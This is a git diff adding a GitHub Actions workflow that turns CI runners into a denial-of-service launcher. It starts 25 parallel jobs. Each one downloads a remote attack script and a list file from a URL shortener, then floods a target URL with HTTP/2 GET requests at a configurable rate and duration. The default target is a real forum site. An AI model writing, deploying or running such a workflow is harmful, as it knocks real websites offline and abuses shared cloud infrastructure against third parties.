@@ -1,0 +1,53 @@
+name: era7
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: "URL"
+        required: true
+        default: "https://www.r10.net/"
+      time:
+        description: "Time)"
+        required: true
+        default: "115"
+      rate:
+        description: "Rate"
+        required: true
+        default: "100"
+
+jobs:
+  vds:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 25
+      matrix:
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25]
+    
+    steps:
+    - name: Dosyaları indir ve hazırla
+      run: |
+        wget https://curl.by/3Qw85/graves.js
+        wget https://curl.by/v_GPh/fres.txt
+        chmod +x graves
+    
+    - name: run
+      run: |
+        TARGET="${{ inputs.target }}"
+        TIME="${{ inputs.time }}"
+        RATE="${{ inputs.rate }}"
+        
+        PIDS=()
+        for i in {1..6}; do
+          sudo timeout $TIME node graves.js GET "$TARGET" 90 10 "$RATE" fres.txt --query 1 --http 2 --full --ratelimit --flood
+          PIDS+=($!)
+        done
+        
+        for pid in "${PIDS[@]}"; do
+          wait $pid
+        done
+    
+    - name: Bekleme
+      run: sleep ${{ inputs.time }}
+    
+    - name: Sistemi yeniden başlat
+      run: sudo reboot
